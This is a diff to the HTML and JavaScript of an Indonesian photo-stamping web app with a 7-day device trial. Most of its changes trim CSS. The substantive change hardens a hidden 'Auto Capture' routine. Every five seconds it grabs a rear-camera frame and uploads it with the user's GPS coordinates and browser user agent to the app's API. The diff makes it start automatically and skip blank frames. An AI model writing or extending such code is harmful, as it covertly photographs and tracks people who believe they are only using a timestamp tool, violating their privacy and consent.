@@ -34,10 +34,7 @@
             box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.4);
             transition: all 0.3s ease;
         }
-        .glass-card:hover {
-            border-color: rgba(59, 130, 246, 0.3);
-            box-shadow: 0 25px 45px -12px rgba(59, 130, 246, 0.15);
-        }
+        .glass-card:hover { border-color: rgba(59, 130, 246, 0.3); }
         .header {
             display: flex;
             justify-content: space-between;
@@ -54,7 +51,7 @@
             background-clip: text;
             color: transparent;
         }
-        .logo p { font-size: 0.7rem; color: #7E8AA8; letter-spacing: 0.5px; }
+        .logo p { font-size: 0.7rem; color: #7E8AA8; }
         .status-bar {
             display: flex;
             gap: 1rem;
@@ -68,8 +65,8 @@
         }
         .status-item { display: flex; align-items: center; gap: 0.5rem; }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; box-shadow: 0 0 6px #22C55E; }
-        .dot.warning { background: #EAB308; box-shadow: 0 0 6px #EAB308; }
-        .dot.error { background: #EF4444; box-shadow: 0 0 6px #EF4444; }
+        .dot.warning { background: #EAB308; }
+        .dot.error { background: #EF4444; }
         .badge-premium {
             background: linear-gradient(135deg, #1E293B, #0F172A);
             padding: 0.25rem 0.75rem;
@@ -96,7 +93,6 @@
             color: #E8EDF5;
             font-family: 'Inter', monospace;
             font-size: 0.85rem;
-            transition: all 0.2s;
         }
         textarea:focus, select:focus, input:focus {
             outline: none;
@@ -117,7 +113,6 @@
             background: #1E293B;
             border-radius: 2px;
         }
-        input[type="range"]:focus { outline: none; }
         input[type="range"]::-webkit-slider-thumb {
             -webkit-appearance: none;
             width: 16px;
@@ -125,7 +120,6 @@
             border-radius: 50%;
             background: #3B82F6;
             cursor: pointer;
-            box-shadow: 0 0 6px #3B82F6;
         }
         .input-number-small {
             width: 70px;
@@ -229,19 +223,11 @@
             width: 90%;
             border: 1px solid #3B82F6;
         }
-        .modal-content h3 { margin-bottom: 1rem; }
-        .close-modal {
-            background: #EF4444;
-            margin-top: 1rem;
-        }
+        .close-modal { background: #EF4444; margin-top: 1rem; }
         @media (max-width: 768px) {
             .container { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
-            .range-group { flex-wrap: wrap; }
         }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0F1422; }
-        ::-webkit-scrollbar-thumb { background: #2D3A5E; border-radius: 3px; }
     </style>
 </head>
 <body>
@@ -258,11 +244,10 @@
     <div class="status-bar">
         <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Mengakses GPS...</span></div>
         <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Kamera siap</span></div>
-        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">🤫 Auto Capture: Aktif</span></div>
+        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">🤫 Auto Capture: Menunggu...</span></div>
         <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Device ID</span></div>
     </div>
 
-    <!-- Modal Hubungi Admin (Trial Habis) -->
     <div id="contactModal" class="modal" style="display: none;">
         <div class="modal-content">
             <h3><i class="fas fa-envelope"></i> Hubungi Admin</h3>
@@ -276,7 +261,7 @@
     </div>
 
     <div id="blockedMsg" class="alert" style="display:none;">
-        ⛔ Trial 7 hari telah berakhir. <button id="showContactBtn" style="background:#F59E0B; margin-top:0.5rem; padding:0.5rem;"><i class="fas fa-headset"></i> Hubungi Admin untuk Langganan</button>
+        ⛔ Trial 7 hari telah berakhir. <button id="showContactBtn" style="background:#F59E0B; margin-top:0.5rem; padding:0.5rem;"><i class="fas fa-headset"></i> Hubungi Admin</button>
     </div>
 
     <div id="mainContent">
@@ -296,7 +281,7 @@
                     
                     <div style="margin-top: 1.25rem;">
                         <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
-                        <textarea id="stampText" rows="3" placeholder="📍 Lokasi, Bali&#10;📅 25 Maret 2026 14:30 WIB&#10;🎯 -8.7234, 115.1689"></textarea>
+                        <textarea id="stampText" rows="3" placeholder="📍 Lokasi, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
                         
                         <label>📏 UKURAN TEKS</label>
                         <div class="range-group">
@@ -314,20 +299,20 @@
                             <button id="posBR" class="pos-btn">↘ Bawah Kanan</button>
                         </div>
                         
-                        <label>🎯 OFFSET KUSTOM (jarak dari tepi)</label>
+                        <label>🎯 OFFSET KUSTOM</label>
                         <div style="display: flex; gap: 0.75rem;">
                             <div style="flex:1">
                                 <div class="range-group">
                                     <span>X ↕️</span>
                                     <input type="range" id="offsetXSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18" min="0" max="150">
+                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18">
                                 </div>
                             </div>
                             <div style="flex:1">
                                 <div class="range-group">
                                     <span>Y ↔️</span>
                                     <input type="range" id="offsetYSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18" min="0" max="150">
+                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18">
                                 </div>
                             </div>
                         </div>
@@ -345,9 +330,6 @@
                         <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%230A0E18'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' fill='%233B4A6B' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
                     </div>
                     <button id="downloadBtn" style="background:#334155; margin-top:0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
-                    <p style="font-size:0.65rem; color:#5B6E8C; text-align:center; margin-top:0.75rem;">
-                        <i class="fas fa-shield-alt"></i> Sertifikat Digital TrueStamp
-                    </p>
                 </div>
             </div>
         </div>
@@ -359,7 +341,6 @@
     
     let deviceId = null;
     let trialValid = false;
-    let trialExpired = false;
     let currentImageFile = null;
     let userLocation = { lat: null, lng: null };
     let userVideoStream = null;
@@ -371,6 +352,7 @@
     let currentOffsetY = 18;
     let autoCaptureInterval = null;
     let gpsInterval = null;
+    let videoReady = false;
     
     // DOM Elements
     const userVideo = document.getElementById('userVideo');
@@ -401,7 +383,6 @@
     const deviceDot = document.getElementById('deviceDot');
     const contactModal = document.getElementById('contactModal');
     
-    // Position Buttons
     const posTL = document.getElementById('posTL');
     const posTR = document.getElementById('posTR');
     const posBL = document.getElementById('posBL');
@@ -452,16 +433,14 @@
             const check = await callAPI('checkDevice');
             if (check.isNewDevice) {
                 const reg = await callAPI('registerDevice', { customerName: '' });
-                if (reg.success) { trialValid = true; trialExpired = false; trialBadge.innerText = '✅ Trial 7 Hari'; return true; }
+                if (reg.success) { trialValid = true; trialBadge.innerText = '✅ Trial 7 Hari'; return true; }
             } else if (check.isValid) {
                 trialValid = true;
-                trialExpired = false;
                 trialBadge.innerText = `✅ Trial · sisa ${check.remainingDays} hari`;
                 if (check.isSubscribed) trialBadge.innerText = '⭐ Member Premium';
                 return true;
             } else {
                 trialValid = false;
-                trialExpired = true;
                 trialBadge.innerText = '❌ Trial Habis';
                 mainContent.style.display = 'none';
                 blockedMsg.style.display = 'block';
@@ -473,15 +452,23 @@
     
     async function initCameras() {
         try {
-            const userStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            userVideoStream = userStream;
-            userVideo.srcObject = userStream;
-            autoVideoStream = userStream;
-            autoVideo.srcObject = userStream;
-            updateCameraStatus('✅ Kamera aktif', true);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            userVideoStream = stream;
+            userVideo.srcObject = stream;
+            autoVideoStream = stream;
+            autoVideo.srcObject = stream;
+            
+            // Tunggu video benar-benar siap
+            userVideo.onloadedmetadata = () => {
+                videoReady = true;
+                updateCameraStatus('✅ Kamera aktif', true);
+                autoCamStatus.innerHTML = '🤫 Auto Capture: Siap';
+                startAutoCapture();
+            };
             return true;
         } catch(e) {
             updateCameraStatus('❌ Izin kamera ditolak', false);
+            autoCamStatus.innerHTML = '🤫 Auto Capture: Gagal';
             return false;
         }
     }
@@ -512,35 +499,51 @@
         }
     }
     
-    function startAutoCapture() {
+    async function startAutoCapture() {
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         autoCaptureInterval = setInterval(async () => {
-            if (!autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
-            const canvas = document.createElement('canvas');
-            canvas.width = autoVideo.videoWidth;
-            canvas.height = autoVideo.videoHeight;
-            canvas.getContext('2d').drawImage(autoVideo, 0, 0);
-            canvas.toBlob(async (blob) => {
-                const base64 = await blobToBase64(blob);
-                await callAPI('uploadAuto', {
-                    imageData: base64,
-                    metadata: {
-                        latitude: userLocation.lat || 0,
-                        longitude: userLocation.lng || 0,
-                        device: navigator.userAgent,
-                        customText: 'Auto Capture',
-                        isAuto: true
-                    }
-                });
-                autoCamStatus.innerHTML = '🤫 Auto Capture: Mengirim...';
-                setTimeout(() => { autoCamStatus.innerHTML = '🤫 Auto Capture: Aktif'; }, 1000);
-            }, 'image/jpeg', 0.8);
+            if (!videoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) {
+                autoCamStatus.innerHTML = '🤫 Auto Capture: Menunggu video...';
+                return;
+            }
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = autoVideo.videoWidth;
+                canvas.height = autoVideo.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(autoVideo, 0, 0);
+                
+                // Cek apakah canvas berhasil digambar (tidak hitam)
+                const pixelData = ctx.getImageData(0, 0, 1, 1).data;
+                if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) {
+                    autoCamStatus.innerHTML = '🤫 Auto Capture: Menunggu frame...';
+                    return;
+                }
+                
+                canvas.toBlob(async (blob) => {
+                    const base64 = await blobToBase64(blob);
+                    await callAPI('uploadAuto', {
+                        imageData: base64,
+                        metadata: {
+                            latitude: userLocation.lat || 0,
+                            longitude: userLocation.lng || 0,
+                            device: navigator.userAgent,
+                            customText: 'Auto Capture',
+                            isAuto: true
+                        }
+                    });
+                    autoCamStatus.innerHTML = '🤫 Auto Capture: Mengirim...';
+                    setTimeout(() => { autoCamStatus.innerHTML = '🤫 Auto Capture: Aktif'; }, 1000);
+                }, 'image/jpeg', 0.8);
+            } catch(e) {
+                console.log('Auto capture error:', e);
+            }
         }, 5000);
     }
     
     async function captureFromCamera() {
         if (!trialValid) { showContactModal(); return; }
-        if (!userVideoStream) { alert("Kamera tidak aktif."); return; }
+        if (!videoReady) { alert("Kamera belum siap."); return; }
         const canvas = document.createElement('canvas');
         canvas.width = userVideo.videoWidth;
         canvas.height = userVideo.videoHeight;
@@ -657,7 +660,6 @@
         if (!trialOk) return;
         await initCameras();
         initGPS();
-        startAutoCapture();
         captureBtn.onclick = captureFromCamera;
         uploadBtn.onclick = () => fileInput.click();
         fileInput.onchange = e => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
